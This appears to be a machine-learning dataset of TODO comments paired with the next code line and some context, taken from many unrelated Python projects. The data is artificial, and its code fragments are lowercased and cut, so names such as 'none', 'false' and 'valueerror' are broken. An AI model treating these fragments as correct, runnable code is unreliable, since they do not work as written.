# todo: make it more stringent? </s> try:	_transfer akey_path = self._get_key_path(akey) except CommandError: self.runner(["git", "annex", "get", "--key", akey], cwd=self.path)
# todo(danms) once libvirt has support for lxc hotplug, </s> domxml = virt_dom.xmldesc(libvirt.vir_domain_xml_secure)	attach_volume if FLAGS.libvirt_type == 'lxc': self._attach_lxc_volume(conf.to_xml(), virt_dom, instance_name) self._conn.defineXML(domxml) else:
# todo: what decorator should we put here? in scipy.fftpack there is no planning, </s> def test_ifftn_plan(self, xp, scp, dtype):	test_ifftn_plan @testing.for_complex_dtypes() x = testing.shaped_random(self.shape, xp, dtype) x_orig = x.copy()
# todo: refactor common tests for all models, e.g. shape checking </s> scores = model.forward_owa(triples)	test_hole batch_size = 16 triples = torch.zeros(batch_size, 3, dtype=torch.long) assert scores.shape == (batch_size, 1) scores = model.forward_cwa(triples[:, :2])
# todo: more arguments possible: objectdb etc. </s> if not exists(join(path, '.git')):	__init__ if url is not None: Repo.clone_from(url, path) self.repo = Repo.init(path, True) else:
# todo: non-numeric columns should be ignored automatically </s> def test_impl(n):	test_mean1 def test_mean1(self): df = pd.DataFrame({'A': np.arange(n)+1.0, 'B': np.arange(n)+1}) return df.mean()
# todo: upsert is too much. insert is fine as all keys are deleted. </s> upsert_keys(self.session, featurekey, key_map)	_after_apply key_map[key].add(cand.__class__.__tablename__) self.session.query(FeatureKey).delete(synchronize_session="fetch")
# todo: make sure limits are deterministic then update this </s> assert self.viewer.axes.get_ylabel() == 'world 0'	test_basic assert self.viewer.state.x_att_world is self.image1.id['World 1'] assert self.viewer.state.x_att is self.image1.pixel_component_ids[1] assert self.viewer.state.y_att_world is self.image1.id['World 0'] assert self.viewer.state.y_att is self.image1.pixel_component_ids[0]
# todo: check arp reply is valid </s> self.asserttrue(self.packet_outs_from_flows(arp_replies))	test_add_del_route 'arp_source_ip': '10.0.0.1', 'arp_target_ip': '10.0.0.254'}) valve_vlan = self.valve.dp.vlans[0x100] ip_dst = ipaddress.IPv4Network('10.100.100.0/24')
# todo: more? </s> yield entry	pipe_fetch entry['y:title'] = entry.get('title') entry['y:id'] = entry.get('id') if item.get('forever'): break
return s #todo return partial result instead of giving up </s> else:	bad_empty_lines_removed continue else: return s #TODO return partial result instead of giving up else:
# wait until the chunks have added, todo change this to a qtbot.waitsignal </s> qtbot.wait(short_loading_delay)	test_tiled_screenshot visual = viewer.window.qt_viewer.layer_to_visual[layer] assert isinstance(visual, VispyTiledImageLayer) screenshot = viewer.screenshot(canvas_only=True) center_coord = np.round(np.array(screenshot.shape[:2]) / 2).astype(np.int)
f = self.uri('#%s' % f[2:]) # todo: can we make formula identifiers urirefs? </s> return f	formula def formula(self): f = self.bnode('formula')
# todo: write </s> merged = {}	dict_merge def dict_merge(*dicts): [merged.update(d) for d in dicts] return merged
## todo: # fixme: remove me </s> if not paste_childrens:	get_all_pastes_domain paste_parent = father.replace(self.paste_directory, '')[1:] paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(paste_parent)) paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(father)) for children in paste_childrens:
# todo: remove in v1.5 </s> return self.training_type_plugin.results	results In distributed training, we make sure to transfer the results to the appropriate master process.
# todo: get a buffer to test against </s> obj = classmark_3_value_part.clone()	test_mscm3 def test_mscm3():
# todo: also save as json </s> try:	declare_artefact coll.add_attributes(coll_attribs) return coll members = [] for each_input_obj in iter(value):
# todo: add docstring </s> new_params = subdict(params, drop=hh_arg_attrs)	get_concise_params_dict def get_concise_params_dict(params, split_args=False): arg_vals = {} if len(params.get(U_ARGS, [])) > len(params.get(D_ARGS, [])):
# todo: make mac table updates less expensive. </s> for i, entry in enumerate(sorted(port_vlan_hosts)):	_update_port port_vlan_hosts = port.hosts(vlans=[vlan]) assert port_vlan_hosts_learned == len(port_vlan_hosts) self.metrics.learned_macs.labels( **dict(port_vlan_labels, n=i)).set(entry.eth_src_int)
# todo: check the data! </s> self.asserttrue(len(list(pipe)) > 0)	test_fetchsitefeed pipe_def = self._get_pipe_def(pipe_file) pipe = pipe2py.compile.parse_and_build_pipe(self.context, pipe_def)
# todo: move this to pymatgen </s> if not specie_string:	unicodeify_species def unicodeify_species(specie_string): return "" superscript_unicode_map = {
# todo there is a cleaner way to do this in python 2.6, once </s> warnings.simplefilter('default', userwarning)	test_compute_flag self.assertRaises(UserWarning, T.dot, x, y) finally: finally: theano.config.compute_test_value = orig_compute_test_value
# todo: update after date time test function code clean up. </s> self.assertequals(event_object.timestamp, 1289410646484375)	testParse23MultiVolume event_object.timestamp_desc, eventdata.EventTimestamp.LAST_RUNTIME) event_object = event_container.events[0] self.assertEquals( event_object.timestamp_desc, eventdata.EventTimestamp.CREATION_TIME)
# todo: create unsupportedproviderexception. (?) </s> raise exception("this provider is not supported: {p}".format(p=cli_context.obj['provider']))	start start_ec2(cluster_name=cluster_name, region=ec2_region) else:
# todo use deepcopy() here </s> return polygonsonimage(polygons, shape)	on else: polygons = [poly.project(self.shape, shape) for poly in self.polygons]
# todo: funcbody </s> self.assertequal(7, p._pos)	testFunctionNoArgs self.assertIsNotNone(node)
# end todo </s> x = unfold_func(module)(module.input0)	weight_diag_ggn sqrt_ggn = sqrt_ggn.view(num_classes * batch, out_features) sqrt_ggn = sqrt_ggn.view(num_classes * batch, out_channels, out_x * out_y) X = X.repeat(num_classes, 1, 1) sqrt_ggn = einsum('bml,bkl->bmk', (sqrt_ggn, X)).contiguous()
# todo: switch to: </s> self.change_track(tl_track)	next tl_track = self.core.tracklist.next_track(self.current_tl_track) if tl_track: else: self.stop(clear_current_track=True)
# todo we could reload the message </s> pass	Forward await self.get_input_sender()) except ValueError: return self._sender @property
# todo: add test and check this more throughroughly. </s> if hasattr(layer, "activation"):	contains_activation Check whether the layer contains an activation function. activation is None then we only check if layer can contain an activation. if activation is not None: return layer.activation == keras.activations.get(activation)
# todo replace with pec byte check </s> if res[0] == 0xaa and res[1] == data_len + 2 and res[2] == data_len:	_exec_page_plus_read self._write(msg) res = self._read() data = res break
# todo: log exception </s> continue	_write_missing_module_configs conf = mod.DEFAULTCONF except Exception as e: ConfNeedsWrite = True Config.add_section(modname)
# todo: push all this code down to vigotoline? </s> self.view.run_command('vi_enter_normal_mode')	ExGoto self.view.show(self.view.sel()[0]) elif state.mode in (MODE_VISUAL, MODE_VISUAL_LINE) and line_range['right_offset']: self.view.window().run_command('vi_add_to_jump_list') b = self.view.rowcol(self.view.sel()[0].b - 1)[0] + line_range['right_offset'] + 1
# todo enforce uniqueness on arrange panel? </s> models.siparrange.objects.create(	copy_to_arrange logging.debug('copy_to_arrange: files to be added: {}'.format(to_add)) for entry in to_add: original_path=entry['original_path'], arrange_path=entry['arrange_path'],
# todo: replace with np.isnat </s> return self._replace_func(	_run_call_hiframes arr_typ.dtype, (types.NPDatetime, types.NPTimedelta)): nat = arr_typ.dtype('NaT') lambda arr,i: arr[i] == nat, [arr, ind]) elif arr_typ.dtype != string_type:
# todo: compare to plain for loop through the labels </s> sel = n.array([], dtype=n.int16)	_getSampleIdsByAttr if not operator.isSequenceType(values): values = [ values ] for value in values: sel = N.concatenate((
# todo(b/142684737): the multi-processing api might change. </s> beam_pipeline_args=['--direct_num_workers=%d' % direct_num_workers])	_create_pipeline metadata_connection_config=metadata.sqlite_metadata_connection_config( metadata_path),
# todo: check that the birth date is not in the future </s> except valueerror, e:	is_valid try: birth_date = _get_birth_date(number) return False if len(number) == 10:
# todo support for absolute episode scrobbling </s> log.info('absolute season mappings are not supported yet')	episode_request return None if match.absolute_num is not None: return None if match.season_num is None or match.episode_num is None:
# todo(nnorwitz): this doesn't handle namespaces properly. </s> for node in ast_list:	_IsSymbolUsed def _IsSymbolUsed(self, ast_list, symbol): if node.Requires(symbol): return True
federated_only=self.federated_only)  # todo: 466 </s> new_nodes = []	parse_and_maybe_validate_fleet_bytes node_list = Ursula.batch_from_bytes(node_payload, registry=self.registry, for node in node_list: if not set(self.learning_domains).intersection(set(node.serving_domains)):
# todo: error detection </s> __connect()	deserialize_item_raw def deserialize_item_raw(collection_type, item_name): collection = mongodb[obj.collection_type()] data = collection.find_one({'name':item.name})
# todo: find another way </s> for i in range(n):	scroll_up self.win_y = 0 else: self.dump_update_up(self.win_y, h) if self.win_y == 0:
# todo: handle multiple skip stacks </s> first_level_skip, = original_skip_stack	flex_layout if child_resume_at is not None: if original_skip_stack: else: first_level_skip = 0
# todo: currently this test breaks the bleu implementation (13.03.2016) </s> references = ['john loves mary'.split()]	test_case_where_n_is_bigger_than_hypothesis_length def test_case_where_n_is_bigger_than_hypothesis_length(self): hypothesis = 'John loves Mary'.split() n = len(hypothesis) + 1 #
# todo: update the review with a message </s> gitcontext, review_branch, working_branch)	processUpdatedRepo abdt_workingbranch.pushBadInReview(
assert isinstance(obj_type, instance)  # todo more flexible </s> typeinfo = (cast(instance, obj_type)).type	visit_assignment_stmt indexexpr = cast(IndexExpr, lvalue) obj_type = self.types[indexexpr.base] base = self.accept(indexexpr.base) index = self.accept(indexexpr.index)
# todo: redundancy between all gaze mappers -> might be moved to parent class </s> audio.say("stopping calibration")	stop def stop(self): logger.info("Stopping Calibration") self.smooth_pos = 0,0
# todo: this will need to be more complicated to support sparse features </s> next_state = net.lengthstile(	TrainingFeatureExtractor if self.max_q_learning and self.sorted_action_features is not None: next_state_field = "tiled_next_state" [next_state, input_record.possible_next_actions.lengths()], ["tiled_next_state"],
# todo: feed.abort() should be done by using exception? not a flag that has to be checked everywhere </s> self.__abort = false	__init__ self.rejected = [] # rejected entries self.failed = [] self.__purged = 0 self.current_event = None
# todo: handle unsigned </s> maxage = str2time(re_t.group(1), self.timestamp)	should_be_archived if not self.timestamp: return None if self.now - self.timestamp > maxage: duration = str2localized_duration(archiver.site, re_t.group(1))
# time.sleep(40)  # todo: should remove after polling get. </s> res_ptr.block_with_timeout(secs=40)	test_mpc_private_private_op op = getattr(operator, op_str) res_ptr = op(mpc_tensor_1, mpc_tensor_2) res = res_ptr.reconstruct() expected = op(value_1, value_2)
from .mpc import quadcost, lindx # todo: this is messy. </s> assert x_init is not none or x is not none	get_cost def get_cost(T, u, cost, dynamics=None, x_init=None, x=None): if isinstance(cost, QuadCost): C = get_data_maybe(cost.C)
# todo: move to 80 bits </s> arg = m2_expr.exprmem(arg.arg, size=64)	mem2double if isinstance(arg, m2_expr.ExprMem): if arg.size > 64: return m2_expr.ExprOp('mem_%.2d_to_double' % arg.size, arg) else:
# todo parameter order? (for clobj_list) </s> _handle_error(_lib.create_context(ptr_ctx, c_props,	Context ptr_devices, num_devices = _clobj_list(devices) ptr_ctx = _ffi.new('clobj_t*') num_devices, ptr_devices)) else:  # TODO: from dev_type
# todo(b/134377706): remove the wrapper once the bug is fixed. </s> @tf.function	testComputationAgainstLSTM initial_state = unrolled_lstm.initial_state(self.batch_size) if use_tf_function: def unrolled_lstm_fn(*args, **kwargs): with tf.device("/device:{}:0".format(self.primary_device)):
# todo: support all tzinfo subclasses by calling utcoffset() </s> raise valueerror('only tzfixedoffset supported.')	from_timestamp tz = local_timezone elif tz.__class__ is not TZFixedOffset: return _timestamp_to_date_time(timestamp, tz)
# todo(ytknzw): add more specific assertion with the test case. </s> figure = plot_slice(study)	test_plot_slice assert figure.has_data() is False study = prepare_study_with_trials(with_c_d=False) assert figure.has_data() is True figure = plot_slice(study, params=["param_a"])
col_width = 30  # todo: use screen size </s> return " " * indent + text	indent def indent(text: str, indent: int = 1) -> str:
# user perm is created on todo but for doctype assignment rule only </s> self.assertequals(new_doc.doc, "todo")	test_user_perm_on_new_doc_with_user_default set_session_default_values({"doctype": "ToDo"}) new_doc = frappe.new_doc("Doc A") frappe.set_user('Administrator') clear_session_defaults()
# todo: implement positional encoding as described in the paper. </s> with tf.variable_scope("position_embedding"):	decode memory_sequence_length=None, return_logits=True): input_dim = inputs.get_shape().as_list()[-1] position_embedding = create_position_embedding(
# todo: fix/disambiguate. </s> for timespan in node.payload:	elementsOverlappingOffset if node.position < offset < node.endTimeHigh: result.extend(recurse(node.leftChild, offset, indent + 1)) if offset < timespan.endTime: result.append(timespan)
@pytest.mark.filterwarnings('ignore:missing metadata')  # todo: fix bug for hgs maps </s> def test_reproject_to_hgs(aia171_test_map, hgs_header):	test_reproject_to_hgs @figure_test aia171_test_map.reproject_to(hgs_header).plot()
# todo: test require restart </s> tasks.restart_named(self.master, self.replicas[0])	test_disable_reenable_signing_master ] self.master.run_command(args) assert wait_until_record_is_signed( self.master.ip, test_zone, timeout=100
# todo add locales </s> raise yunohosterror("bad_value_type", value_type=type(mail))	domain_set_settings mail = mail in ["True", "true", "1"] except: domains[domain]["mail"] = mail setting_set = True
# todo: it has not been decided by the css working group how </s> if percent1 is not none:	evaluate first = None second = None percent1 = max(percent1, 0) if percent2 is not None:
# todo add locales </s> raise yunohosterror("domain_name_unknown", domain=domain)	_load_zone_of_domain domains = _load_domain_settings() if not domain in domains.keys(): return domains[domain]["dns_zone"]
# todo should print message but carry on as if 0 </s> util.error('printf: %s: invalid number', val)	Printf num = int(val) except ValueError: return 1 parts.append(str(num))
# todo: logging </s> contract_sizes = dict()	deploy_contract deploy_transaction = {'from': self.deployer_address} deploy_bytecode = contract_factory.constructor(*args, **kwargs).buildTransaction(deploy_transaction) if len(deploy_bytecode['data']) > 1000: contract_sizes[contract_name] = str(len(deploy_bytecode['data']))
# todo: move to base class </s> return self._manipulationmode	Canvas @property def manipulationMode(self): @manipulationMode.setter def manipulationMode(self, value):
# todo: assert </s> self.asserttrue(result)	test_rename_system system = self.remote.get_item_handle("system", "testsystemcopy", self.token) result = self.remote.rename_system(system, "testsystem1", self.token) assert 0
# todo: simplest possible unicast learning. </s> host_learned_other_dp = none	rcv_packet learn_port = port else:
# todo: can we use a real variablemanager? </s> mock_variable_manager = magicmock(name='mockvariablemanager')	test_process_include_results return None mock_inventory.get_host.side_effect = _get_host mock_variable_manager.get_vars.return_value = dict() res = IncludedFile.process_include_results(results, mock_tqm, mock_iterator,
# todo implement for all channels </s> def _handle_toggle(self, message):	_handle_toggle return None
self.setup()  # todo: perhaps, remove this to pass path in context </s> current_ids = self.hash(	fit_transform :param expected_outputs: the expected data output to fit on :return: the pipeline itself current_ids=None, hyperparameters=self.hyperparams,
# todo: remove in 1.2 </s> return self._deprecated_fit	fit_ def fit_(self):
r = redirect("../../..") # todo: no longer correct </s> d = defer.deferred()	rebuild else: bc.resubmitBuild(b, reason) reactor.callLater(1, d.callback, r) return DeferredResource(d)
#todo: implement xml support </s> return "whatever, we don't have xml yet"	create_tenant return body elif accept_header == 'application/xml': else: return body
### todo: need to improve </s> calculate scrf scores with hscrf	HSCRF_scores def HSCRF_scores(self, feats): args: feats (batch_size, sentence_len, featsdim) : word representations
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_depth_float def test_fail_depth_float(self): ``depth`` is a float.
# todo: check </s> self.projection_matrices = nn.embedding(num_relations, self.entity_embedding_dim * self.relation_embedding_dim)	__init__ self.entities_embeddings = nn.Embedding(num_entities, self.entity_embedding_dim) self.relation_embeddings = nn.Embedding(num_relations, self.entity_embedding_dim) self.margin_loss = margin_loss
# todo: save as yaml file </s> directory = '~/.ros/handeye_calibration'	_write_to_file def _write_to_file(self, calibration): if not os.path.exists(directory): os.makedirs(directory)
# todo: confirm if gpu is used in hpo (probably not) </s> if params.get('task_type', none) == 'gpu':	_fit if 'task_type' not in params: params['task_type'] = 'GPU' if 'colsample_bylevel' in params: params.pop('colsample_bylevel')
# todo: enable custom config </s> if base.lower() != e['word'][0:len(base)].lower():	_refresh_completions if 'menu' not in e: e['menu'] = self._sources[name].get('abbreviation','') continue tmpmatches.append(e)
# todo: some other way? this seems like a slippery slope of convenience functions </s> def fire_progress(data, outputter='pprint'):	fire_progress progress_event = {'data': data, 'outputter': outputter}
report_config = {}  # todo port to fooddata.from_request </s> request_slugs = [	report_config @property def report_config(self): 'gender', 'age_range',
# todo: document params </s> super(deepcheckresultsrenderer, self).__init__()	DeepCheckResultsRenderer formatArgument = "output" def __init__(self, client, monitor): self.client = client self.monitor = monitor
# todo: should be named get_fields() ? </s> return self.model.get_translated_fields()	ParlerMeta def get_translated_fields(self): Return the translated fields of this model. def __repr__(self): return "<ParlerMeta: {0}.{1} to {2}>".format(
return 0 # todo </s> def get_required_building_resources(self, resource_id):	get_required_building_resources
# todo:  implement this using in-memory locking </s> pass	LockFile @handle_fs_errors def LockFile(self, path, byteOffset, length, info):
# todo: exp_block_pairs </s> self.assertequal(17, p._pos)	testStatIfElseIf self.assertIsNotNone(node)
# todo: fix this </s> href.text = _href(uri.replace("//", "/"))	_propfind_response else: uri = "/".join((path, item.href)) response.append(href) propstat404 = ET.Element(_tag("D", "propstat"))
# todo: does this import need to be delayed because </s> from pyomo.solvers.plugins.solvers.persistent_solver import \	_preprocess_scenario def _preprocess_scenario(self, scenario_name, solver): PersistentSolver assert scenario_name in self._scenario_instance
""" todo. """ </s> def __init__(self, name, url, auth=none):	KodiDevice class KodiDevice(MediaPlayerDevice): self._name = name self._url = url
#todo: add csrf here? or make ids uuid so they can't be guessed? </s> def _index_put(request):	_index_PUT try: relay_address = RelayAddress.objects.get(
# todo: weather data source changed, temporarily disable, will enable it later when new data source is available. </s> self._is_temp = is_temp	CitiBikeTopology super().__init__() self._data_pipeline["trip"] = CitiBikePipeline(topology, trip_source, station_info, is_temp) def __del__(self): if self._is_temp:
pass # todo </s> def _save(self, name):	_save @register(r'^save (?P<name>\S+)$')
#todo investigate 3.5/3.6 slowness </s> print('sum = {:f}'.format(sum(rewards)))	test_trpo_agent return
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_empty def test_fail_empty(self): Request is empty.
# todo verify </s> form = {'ajax': '1', 'pn': 'p1', 'htv': 'm'}	top30in30 def top30in30(self): req_url = "http://www.google.com/trends/hottrends/hotItems" req = self.ses.post(req_url, data=form)
''' todo: test failing as of 2015/06/03 and needs to be completed. ''' </s> def callback(err):	test_success_static_instance_discovery @httpretty.activate def test_success_static_instance_discovery(self): if err: raise Exception(err)
# todo(bcipolli): bulk saving of logs </s> log.save()	generate_fake_video_logs ) log.full_clean() video_logs.append(log) return video_logs
# todo: this is a hack to make a rule know </s> if any(f[: f.rfind("_")] in key for key in state.keys()):	_features_in_state for f in fs: if f.endswith("_None"): return False elif f not in state:
# todo: let this exception propagate </s> return false, none, bytes_transferred	_upload_data response.connection.connection.send(data) except Exception: bytes_transferred = len(data) if calculate_hash:
# todo: fix this to properly record the last stream id we've seen. </s> if self.streams:	_terminate_connection GOAWAY frames. f = GoAwayFrame(0) f.last_stream_id = sorted(self.streams.keys())[-1] else:
pass # todo </s> def try_undo(self, *args):	try_undo
#     todo </s> return os.close(fh)	Filesystem
# todo: we probably don't want to say this for re-formulation ones. </s> result = "reduced scope of tried block."	explain def explain(): if pre_statements: result += " Leading statements at %s." % (
# todo: capture stdout for both the test assert and docs embedding </s> prob.run_model()	test_feature_iprint_2 ln_scipy.options['iprint'] = 1
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo(kan-bayashi): need to be fixed in pytorch v4 </s> if torch_is_old:	__call__ spembs_tmp = [spembs_tmp[i] for i in sorted_idx] spembs = torch.from_numpy(np.array(spembs_tmp)).float() spembs = Variable(spembs, volatile=not is_training) if sum(self.device) >= 0:
# todo: compare col/row widths before/after - not implemented yet </s> range('sheet1', 'a1:d4').value = 'test_string'	test_autofit_range def test_autofit_range(self): Range('Sheet1', 'A1:D4').autofit() Range('Sheet1', 'A1:D4').autofit(0)
# todo(b/186451541): reduce the number of calls to model_fn. </s> self.assertequal(mock_model_fn.call_count, 4)	test_construction_calls_model_fn federated_averaging.build_federated_averaging_process( model_fn=mock_model_fn, client_optimizer_fn=tf.keras.optimizers.SGD)
# todo: show deprecation message in the future. </s> return results	list_preprocessors except ValueError as err: pass
# todo 当我不使用下面的语句时，project和host貌似在线程里面会没有值，也许我要把lazy值设置成select或者其他 </s> a = deploy.project, deploy.host	rollback def rollback(self, deploy): t = threading.Thread(target=rollback_thread, args=(self, deploy)) t.start()
# todo: improve the unicode checking </s> try:	Base "relationships?)") def __getitem__(self, key, tx=None): safe_key = urllib.quote(key) except (KeyError, UnicodeEncodeError, UnicodeError):
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	init_host def init_host(self, host):
# todo _cphttptools.applyfilterlist('afterrequestheader') </s> if cpg.request.parsepostdata:	do_POST cpg.request.parsePostData = 1 cpg.request.rfile = self.rfile _cphttptools.parsePostData(self.rfile) _cphttptools.doRequest(self.wfile)
# todo: maybe[int] and maybe[simple_sum] are invalid </s> return c_type	_GetCppType elif type_name == 'maybe': c_type = _GetCppType(typ.children[0]) elif typ.resolved: if isinstance(typ.resolved, asdl_.SimpleSum):
# todo(efried): change this to an inner join when we are sure all </s> join_chain = sa.outerjoin(	_anchors_for_sharing_providers shr_with_sps.c.root_provider_id, shr_with_sps.c.id)]) else: join_chain, rps, shr_with_sps.c.root_provider_id == rps.c.id) sel = sa.select([sps.c.uuid, func.coalesce(rps.c.uuid,
pass # todo </s> def test_update(self):	test_update
# todo: check what other filetpyes supported </s> try:	run_on_folder img_list = [] for file in os.listdir(input_folder): if force_jpg == False: if file.endswith('.png') or file.endswith('.PNG'):
# todo: [config] modify for new importer </s> continue_system_importer_file_csv = false	run_check_content_attributes def run_check_content_attributes(request, row, row_counter, model): if not row[model.csv_column_system - 1]: messages.error(request, "Value for system in row " + str(row_counter) + " was an empty string. System not created.")
#todo - use a context manager here once we drop python 2.6 </s> self.assertraises(valueerror, kcluster, data,	test_kcluster [ 1, 1 ], [ 1, 1 ]], int) **{"nclusters": 3, "mask": mask, "weight": weight, "transpose": 0, "npass": 100,
# todo: remove anytime in 2016 </s> _assert(false, "module set but not a valid number!")	_get_key def _get_key(): if parsed_params.module is not None and parsed_params.get_module_int() is None: return [domain, parsed_params.status, parsed_params.app_id] elif parsed_params.most_granular_filter == 'xmlns':
# todo test </s> self.unconstrained_effect_repertoire(purview))	effect_info return utils.emd(self.effect_repertoire(mechanism, purview),
# todo: test this </s> post.duration = duration.graceduration(post.duration.quarterlength)	chordFromElement post.tie = _tieFromAttr(elem.get('tie')) if elem.get('grace') is not None: if elem.get('m21TupletNum') is not None: post.duration.appendTuplet(duration.Tuplet(numberNotesActual=int(elem.get('m21TupletNum')),
# todo not an api for now </s> nodecontrolutil._get_info_from_package_manager(*packages)	test_generated_cmd_get_info_from_package_manager def test_generated_cmd_get_info_from_package_manager(catch_generated_command): packages = ['package1', 'package2'] assert generated_command == "apt-cache show {}".format(" ".join(packages))
# todo: reflection padding </s> fsconv = tf.nn.conv2d_transpose(input, weights,	uk biases = tf.get_variable("biases", [k], initializer=tf.constant_initializer(0.0)) strides=[1, 2, 2, 1], padding='SAME') bn = batch_norm(fsconv+biases, is_training)
# todo (shea): extract method(s) to get_source_processor() </s> if "sparkle_feed" in facts:	generate_download_recipe recipe.set_description("Downloads the latest version of %s." % facts["app_name"]) keys["Input"]["SPARKLE_FEED_URL"] = facts["sparkle_feed"] sparkle_processor = processor.SparkleUpdateInfoProvider(
# todo: also run container and make sure that the env var is set inside the container </s> buildah("rmi", [target_image])	test_build_basic_image_with_labels assert out["OCIv1"]["config"]["Labels"]["A"] == "B" assert out["OCIv1"]["config"]["Labels"]["x"] == "y"
# todo stdin </s> )	_execute_command expect_stderr=True, expect_fail=True, except CommandError as e: exc = e
# todo: put this into timeframegroup. #316 </s> for timeframe in timeframes:	split_timeframes def split_timeframes(timeframes, duration_threshold): for split in timeframe.split(duration_threshold): yield split
# todo: renderer.media_type isn't the right thing to do here... </s> resp = httpresponse(content, mimetype=renderer.media_type, status=response.status)	render else: content = renderer(self).render() for (key, val) in response.headers.items(): resp[key] = val
# todo generator </s> handle_dirty_dataset(ds, mode=if_dirty)	__call__ for ds_path in content_by_ds: ds = Dataset(ds_path) content = [ap['path'] for ap in content_by_ds[ds_path] if ap.get('type', None) != 'dataset' or ap['path'] == ds.path]
# todo : pytest.mark.parametrise once nose is gone. </s> def test_collections_deque():	test_collections_deque a = deque() a.append(a)
# todo: gdal doesn't support signed 8-bit values, so we coerce to uint8, </s> if dst.dtype.name == 'int8':	warp_affine_rio resampling = resampling_s2rio(resampling) dst0 = dst dst = dst.view('uint8') if src.dtype.name == 'int8':
# todo: this should show up in events </s> yield self.stop(true)	start raise self.log.info('Found existing pod %s, attempting to kill', self.pod_name) self.log.info('Killed pod %s, will try starting singleuser pod again', self.pod_name) else:
# todo: verify </s> manager.unregistered(self.consumer_id)	test_unregistered manager = factory.consumer_agent_manager()
# todo: implement </s> return patches	work_rate_upgrade :rtype: list patches = []
# todo: the following skipped suite and fixtures should be enabled </s> return ['api-key']	_filter_headers def _filter_headers(self):
# todo sync protocol </s> await asyncio.sleep(0.01)	TestWindow win2 = self.open_window() await i3.command(f'[id={win1}] kill; [id={win2}] kill') i3.main_quit() await i3.subscribe([Event.WINDOW])
self.data = fp.read(1_048_576)  # todo: recheck in 0.6.x </s> except unicodedecodeerror:	check_download try: with open(os.fsdecode(self.last_download), mode="r", encoding='utf-8') as fp: with open(os.fsdecode(self.last_download), mode="r", encoding='latin1') as fp: self.data = fp.read(1_048_576)  # TODO: Recheck in 0.6.x
else: self.assertequal(end, 1) # todo: simple exec should not wait_testpid!! </s> top = _recent(output(_top_list))	test_3901_start_false_exec_simple logg.info(" %s =>%s\n%s\n%s", cmd, end, out, i2(err)) if real: self.assertEqual(end, 0) logg.info("\n>>>\n%s", top) self.assertFalse(greps(top, testsleep))
##todo(ziad):we need to figure out how to auth to keystone </s> conn = http_connect(self.auth_host, self.auth_port, 'get',	_validate_claims "Accept": "text/json", "X-Auth-Token": self.admin_token} '/v1.0/token/%s' % claims, headers=headers) resp = conn.getresponse()
# todo(necula): fix gather bug on tpu </s> if jtu.device_under_test() == "tpu":	test_gather @primitive_harness.parameterized(primitive_harness.lax_gather) def test_gather(self, harness: primitive_harness.Harness): raise unittest.SkipTest("TODO: fix bug: not compilable") self.ConvertAndCompare(harness.dyn_fun, *harness.dyn_args_maker(self.rng()))
# todo: refactor the mockrequesthandler </s> class mockrequesthandler(object):	MockRequestHandler def __init__(self): self.n_written = 0
# todo unordered float </s> return fcomip(ir, instr, a, b)	fucomip def fucomip(ir, instr, a=None, b=None):
# todo - temporary until flash algo is rebuilt with 4k page program size </s> super(flash_lpc11u24, self).__init__(target, flash_algo)	__init__ def __init__(self, target):
# todo handle errors </s> vbox = vb_get_box()	vb_stop_vm def vb_stop_vm(name=None, timeout=10000, **kwargs): machine = vbox.findMachine(name) log.info("Stopping machine %s" % name)
# todo: make sure this openssl command works everywhere, maybe we should use a text_base64_decode? </s> sudo("echo %s | openssl base64 -a -d | chpasswd" % (shell_safe(encoded_password)))	user_passwd_bsd sudo("pw usermod '%s' -p %s" % (name, passwd)) else:
# todo: use mapper </s> event_name = self.cube.name	aggregate if "limit" in options: params["limit"] = options["limit"] responses = {} for measure in measure_names:
# todo: specific exception handling </s> display_message("project configuration: error parsing access control rules from %s. configuration may be wrong." % source, "warning", 5)	__parse_access_control parser.parse(acstr.split("\n")) except: parser = None return parser
# todo: improve error handling </s> return make_response("websocket disconnect error.", status_code=500)	handle_ws status_code = connection_table.delete_item(connection_id) if status_code != 200:  # pragma: no cover return make_response("OK", status_code=200)
# todo: automate this (by lookup from nn). </s> internal_states_space=impalaagent.standard_internal_states_space,	test_impala_actor_plus_learner_agent_functionality_actor_part state_space=env.state_space, action_space=env.action_space, execution_spec=dict( mode="distributed",
# todo: replace with assertion test </s> log.debug(obj.lookup('jpnic'))	test__NIRWhoisLookup net = Net('133.1.2.5') obj = NIRWhois(net) net = Net('115.1.2.3') obj = NIRWhois(net)
raise notimplementederror #todo </s> elif q.kw(i,"format"):	parse while i < l: if q.kw(i,"RETURN"): raise NotImplementedError #TODO elif q.kw(i,"REQUEST"):
# todo: empty env? </s> sendrc=false, timeout=120, usepty=false, environ={},	test_simple Obfuscated('hushnow', 'XXXXXXXX'), 'client', '-i'], self.basedir, initialStdin=client_spec) + 0,
# todo verbosity was mistakenly removed from task_parameters on release 0.11.0, need to bring it back </s> if self.ap.is_a_highest_level_agent:	handle_episode_ended self.parent_level_manager.parent_graph_manager.time_metric == TimeTypes.EpisodeNumber: self.update_log() self.log_to_screen()
# todo(b/124466113): remove tf.compat.v2 once tf 2.0 is the default. </s> if hasattr(tf, 'compat.v2'):	testAdaptToRemoveMetricsRemoveFn metric_values = eval_saved_model.get_metric_values() self.assertNotIn('average_loss', metric_values) imported = tf.compat.v2.saved_model.load( eval_export_dir, tags=tf.saved_model.SERVING)
# todo: avoid using default index? </s> with option_context("compute.default_index_type", "distributed-sequence"):	equals >>> midx.equals(idx) False return self is not other and type(self) == type(other) and ( self.to_series().rename("self").to_frame().reset_index()['self'] ==
# todo: once we allow filtering, unit.store.units has to be a qs </s> profile = get_profile(request.user)	get_view_units_for units_qs = store.units current_unit = units_qs.get(id=uid, store__pootle_path=pootle_path) unit_rows = profile.get_unit_rows() preceding = current_unit.store.units.filter(index__lt=current_unit.index).count()
## \todo: remove nodegraph fallback when all client code has been updated </s> if not gaffer.metadata.value( node, "grapheditor:childrenviewable" ) and not gaffer.metadata.value( node, "nodegraph:childrenviewable" ) :	appendContentsMenuDefinitions @classmethod def appendContentsMenuDefinitions( cls, graphEditor, node, menuDefinition ) : return menuDefinition.append( "/ContentsDivider", { "divider" : True } )
# todo: replace with "yield from" when dropping python 2. </s> for stream in self._parse_live_streams(channel):	_get_live_streams res = ajax(CHINFO_URL, cookies=cookies, data=params) channel = http.json(res, schema=_channel_schema) yield stream
